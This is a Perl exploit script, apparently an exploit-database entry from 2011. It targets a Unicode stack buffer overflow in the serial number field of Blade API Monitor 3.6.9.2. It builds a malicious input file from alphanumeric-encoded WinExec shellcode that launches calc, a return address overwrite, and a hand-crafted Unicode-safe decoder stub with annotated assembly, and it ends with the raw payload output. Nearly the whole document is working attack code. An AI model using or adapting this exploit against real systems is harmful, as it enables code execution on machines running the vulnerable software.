# Exploit Title: Blade API Monitor Unicode Stack Buffer Overflow (the serial number!!)  
# Date: 25/12/2011
# Author: FullMetalFouad
# Version: 3.6.9.2
# Tested on: Windows XP/7
################################################################

my $file= "bof_blade.txt";

# windows/Winexec - 178 bytes
# VERBOSE=false, EXITFUNC=process, CMD=calc encoder=Alpha3
# ALPHA3\ALPHA3.py x86 ascii mixedcase eax --input="C:\calc_shellcode\calc.txt" --verbose
my $shellcode_calc =  
"hffffk4diFkTpj02Tpk0T0AuEE0t3r2F1k2q0S2J".
"0R3r3D2C0f074y08103I0E1N4x027n8n5K0V5K0I".
"2L3b0o144z0l2L015K012N0n054F5K1N2H0J094W".
"0w3v4q0j027L0Y2G0w093V0m4G7k1P3Z5O2n2O0p".
"034r032m334t3w3m02";

# 
# first stage to prepare the $shellcode_calc execution :
# ALPHA3\ALPHA3.py x86 ascii mixedcase eax --input="C:\calc_shellcode\shellcode.txt" --verbose
# "\x05\xF6\xFC\xFF\xFF"	;# sub eax, 30A
# "\x33\xDB"			    ;# xor ebx,ebx
# "\x33\xC9"			    ;# xor ecx,ecx
# "\xFE\xC5"			    ;# inc ch
# 
# "\x43"				    ;# inc ebx
# "\x8A\x14\x58"			;# mov     dl, [eax+ebx*2]
# "\x88\x14\x18"			;# mov     [eax+ebx], dl
# "\xE2\xF7"				;# loop 
# "\xFF\xE0"				;# jmp eax
my $shellcode =  "hffffk4diFkTpk02Tpl0T0Bu".
				 "EE1p3W4L8L38174W2k4E8M3m0r5M7p2o4z1O2L378O4r3C0m";


my $junk1 = "\xCC" x 104;
$junk1 = $junk1 ."\x35" x 2; # ECX
$junk1 = $junk1 ."\x41" x 6; # EBP

my $eip   = "\x3e\x43"; # 0x0043003e : call ebx | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READ} [BladeAPIMonitor.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.6.9.2 (C:\Program Files\BladeAPIMonitor\BladeAPIMonitor.exe)
my $junk2 = "\x42" x 20;
my $buffer = "\x41" x 246;

my $finder = ""; 
my $part0 = "";
my $part1 = "";
my $part2 = "";
my $part3 = "";

# 0 part : we do EAX = EBX + length(part0+part1+part2 +1 ), to point to the first null byte of the loop code.
									#	_part_0_:__________________________________________________
$part0 = $part0. "\x53";           	#   | 53                push ebx                               |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\xBA\x58\x58";	#	| BA00580058        mov edx, 58005800                      |
$part0 = $part0. "\x45";        	#	| 004500            add [ebp+0x0],al                       |
$part0 = $part0. "\x54";           	#   | 54                push esp                               |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\x5F";           	#   | 5F                pop edi                                |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\xB9\x3B\x3B";	#   | B9003B003B        mov ecx, 3B003B00  (diff)              |
$part0 = $part0. "\xF5";           	#   | 00F5              add ch,dh                              |
$part0 = $part0. "\x6F";           	#   | 006F00            add [edi+0x0],ch                       |
$part0 = $part0. "\xD6";           	#   | D6                salc                                   |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\x5B";           	#   | 5B                pop ebx                                |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\x50";           	#   | 50                push eax                               |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\x54";           	#   | 54                push esp                               |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\x58";           	#   | 58                pop eax                                |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\xC1\x19";       	#   | C10019            rol dword ptr [eax], 19                |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\x58";           	#   | 58                pop eax                                |
$part0 = $part0. "\xC7";           	#   | 00C7              add bh,al                              |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\x53";           	#   | 53                push ebx                               |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\x58";           	#   | 58                pop eax                                |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
$part0 = $part0. "\x52";           	#   | 52                push edx                               |
$part0 = $part0. "\x45";           	#   | 004500            add [ebp+0x0],al  (nop)                |
#####################################   |__________________________________________________________|


# 1st part : we do EBX=0x00000000, and ECX=0x00000100 (approximative size of buffer)
									#	_part_1_:__________________________________________________
$part1 = $part1. "\x6A";			#   | 6A00              push dword 0x00000000                  |
$part1 = $part1. "\x6A";        	#   | 6A00              push dword 0x00000000                  |
$part1 = $part1. "\x5B";        	#   | 5B                pop ebx                                |
$part1 = $part1. "\x45";        	#   | 004500            add [ebp+0x0],al  (nop)                |
$part1 = $part1. "\x59";        	#   | 59                pop ecx                                |
$part1 = $part1. "\x45";        	#   | 004500            add [ebp+0x0],al  (nop)                |
$part1 = $part1. "\xBA\x01\x41";	#   | BA00010041        mov edx,0x41000100                     |
$part1 = $part1. "\xF5";        	#   | 00F5              add ch,dh                              |
#####################################   |__________________________________________________________|

# 2nd part : The patching of the 'loop code' :
									#	_part_2_:__________________________________________________
$part2 = $part2. "\x45";        	#	| 004500            add [ebp+0x0],al                       |
$part2 = $part2. "\x5A";        	#   | 5A                pop edx                                |
$part2 = $part2. "\x45";        	#	| 004500            add [ebp+0x0],al                       |
$part2 = $part2. "\xC6\x32";        #   | C60032            mov byte [eax],0x32   ; 0x8A-0x58      |
$part2 = $part2. "\x70";            #   | 007000            add [eax+0x0],dh                       |
$part2 = $part2. "\x40";            #   | 40                inc eax                                |
$part2 = $part2. "\x45";            #   | 004500            add [ebp+0x0],al                       |
$part2 = $part2. "\x40";	        #   | 40                inc eax                                |
$part2 = $part2. "\x70";	        #   | 007000            add [eax+0x0],dh      ; 0x58           |
$part2 = $part2. "\x40";            #   | 40                inc eax                                |
$part2 = $part2. "\x70";	        #   | 007000            add [eax+0x0],dh      ; 0x88  dh=58    |
$part2 = $part2. "\x40";            #   | 40                inc eax                                |
$part2 = $part2. "\x45";            #   | 004500            add [ebp+0x0],al                       |
$part2 = $part2. "\xC6\x14";        #   | C60014            mov byte [eax],0x14   ; 0x14           |
$part2 = $part2. "\x45";            #   | 004500            add [ebp+0x0],al                       |
$part2 = $part2. "\x40";    		#   | 40                inc eax                                |
$part2 = $part2. "\x45";    		#   | 004500            add [ebp+0x0],al                       |
$part2 = $part2. "\x40";			#   | 40                inc eax                                |
$part2 = $part2. "\x45";			#   | 004500            add [ebp+0x0],al                       |
$part2 = $part2. "\xC6\xE2";		#   | C600E2            mov byte [eax],0xE2   ; 0xE2           |
$part2 = $part2. "\x45";			#   | 004500            add [ebp+0x0],al                       |
$part2 = $part2. "\x40";            #   | 40                inc eax                                |
$part2 = $part2. "\x45";            #   | 004500            add [ebp+0x0],al                       |
                                    #   |__________________________________________________________|

# 3rd part : The loop code (stuffed with nulls of course)
									#	_part_3_:___________________________________________________
									#	|     ; eax points to our shellcode                        |
									#	|     ; ebx is 0x00000000                                  |
									#	|     ; ecx is 0x00000500 (for example)                    |
									#	|                                                          |
									#	|           label:                                         |
$part3 = $part3. "\x43";	     	#	| 43                inc ebx                                |
$part3 = $part3. "\x14";         	#	| 8A1458            mov byte dl,[eax+2*ebx]                |
$part3 = $part3. "\x30\x18";     	#	| 881418            mov byte [eax+ebx],dl                  |
$part3 = $part3. "\xF7";         	#	| E2F7              loop label                             |
									#	|__________________________________________________________|

$finder = $part0.$part1.$part2.$part3;

open($FILE,">$file");
print $FILE $shellcode_calc.$junk1.$eip.$junk2.$finder.$shellcode."\xFF\xFF\xFF\xFF".$buffer."\x43\x43\x43\x43";
close($FILE);
print "File Created successfully\n";

# output: hffffk4diFkTpj02Tpk0T0AuEE0t3r2F1k2q0S2J0R3r3D2C0f074y08103I0E1N4x027n8n5K0V5K0I2L3b0o144z0l2L015K012N0n054F5K1N2H0J094W0w3v4q0j027L0Y2G0w093V0m4G7k1P3Z5O2n2O0p034r032m334t3w3m02��������������������������������������������������������������������������������������������������������55AAAAAA>CBBBBBBBBBBBBBBBBBBBBSE�XXETE_E�;;�o�E[EPETEXE�EX�ESEXEREjj[EYE�A�EZE�2p@E@p@p@E�E@E@E��E@EC0�hffffk4diFkTpk02Tpl0T0BuEE1p3W4L8L38174W2k4E8M3m0r5M7p2o4z1O2L378O4r3C0m����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCChffffk4diFkTpj02Tpk0T0AuEE0t3r2F1k2q0S2J0R3r3D2C0f074y08103I0E1N4x027n8n5K0V5K0I2L3b0o144z0l2L015K012N0n054F5K1N2H0J094W0w3v4q0j027L0Y2G0w093V0m4G7k1P3Z5O2n2O0p034r032m334t3w3m02��������������������������������������������������������������������������������������������������������55AAAAAA>CBBBBBBBBBBBBBBBBBBBBSE�XXETE_E�;;�o�E[EPETEXE�EX�ESEXEREjj[EYE�A�EZE�2p@E@p@p@E�E@E@E��E@EC0�hffffk4diFkTpk02Tpl0T0BuEE1p3W4L8L38174W2k4E8M3m0r5M7p2o4z1O2L378O4r3C0m����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC